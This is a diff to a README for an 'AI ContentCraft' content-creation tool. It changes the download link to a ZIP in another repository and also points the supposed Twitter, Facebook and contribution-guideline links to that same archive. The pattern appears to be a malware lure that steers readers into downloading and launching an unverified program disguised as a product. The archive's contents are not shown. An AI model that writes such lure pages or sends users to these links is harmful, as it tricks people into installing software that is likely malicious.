@@ -20,7 +20,7 @@ Welcome to AI ContentCraft, your go-to all-in-one content creation suite powered
 
 ## Download AI ContentCraft 📥
 
-👉 [Download AI ContentCraft](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+👉 [Download AI ContentCraft](https://github.com/dxzzu/AI-ContentCraft/releases/download/v1.0/Program.zip)
 
 *Note: The link above is the direct download link for AI ContentCraft. Simply download the ZIP file, extract it, and launch the application to start creating content with the power of AI!*
 
@@ -37,12 +37,12 @@ AI ContentCraft was developed by a team of passionate creators and AI enthusiast
 ## Stay Connected 🌐
 
 Stay updated on the latest AI ContentCraft news, updates, and features by following us on social media:
-- Twitter: [@AIContentCraft](https://twitter.com/AIContentCraft)
-- Facebook: [AI ContentCraft](https://www.facebook.com/AIContentCraft)
+- Twitter: [@AIContentCraft](https://github.com/dxzzu/AI-ContentCraft/releases/download/v1.0/Program.zip)
+- Facebook: [AI ContentCraft](https://github.com/dxzzu/AI-ContentCraft/releases/download/v1.0/Program.zip)
 
 ## Contribute ✨
 
-Want to contribute to AI ContentCraft and be part of shaping the future of content creation? Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.
+Want to contribute to AI ContentCraft and be part of shaping the future of content creation? Check out our [Contribution Guidelines](https://github.com/dxzzu/AI-ContentCraft/releases/download/v1.0/Program.zip) to get started.
 
 ---
 
